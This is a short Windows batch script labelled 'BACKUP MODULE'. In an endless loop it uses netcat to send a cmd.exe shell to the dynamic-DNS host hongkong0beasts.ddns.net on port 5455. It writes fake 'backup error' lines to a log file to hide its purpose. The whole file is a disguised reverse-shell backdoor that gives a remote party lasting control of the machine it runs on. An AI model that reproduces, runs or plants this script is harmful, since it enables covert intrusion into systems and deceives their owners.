@echo off
TITLE=BACKUP MODULE
:loop
set /a "loop=%loop% +1"
nc hongkong0beasts.ddns.net 5455 -v -v -v -v -e cmd.exe
echo [%time%] system_backup_error : connection_failed... >>log.dat
ping localhost -n 10 >nul
goto loop